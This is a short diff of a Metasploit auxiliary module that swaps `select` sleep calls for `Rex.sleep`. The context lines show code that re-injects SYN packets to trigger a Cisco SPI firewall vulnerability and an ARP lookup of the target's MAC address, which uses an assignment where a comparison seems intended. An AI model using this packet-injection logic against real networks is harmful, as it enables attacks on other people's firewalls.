@@ -114,7 +114,7 @@ class Metasploit3 < Msf::Auxiliary
 
           #Trigger Cisco SPI Vulnerability by Double-tapping the SYN
           if packet.tcp_flags.syn == 1 && packet.tcp_flags.ack == 0
-            select(nil, nil, nil, 0.75)
+            Rex.sleep(0.75)
             inj.a2w(:array => [packet.to_s])
           end
           print_status("outpacket processed")
@@ -143,7 +143,7 @@ class Metasploit3 < Msf::Auxiliary
         arp_response = PacketFu::Packet.parse(cap.array[0])
         target_mac = arp_response.arp_saddr_mac if arp_response.arp_saddr_ip = target_ip
       end
-      select(nil, nil, nil, 0.1) # Check for a response ten times per second.
+      Rex.sleep(0.1) # Check for a response ten times per second.
     end
     return target_mac
   end
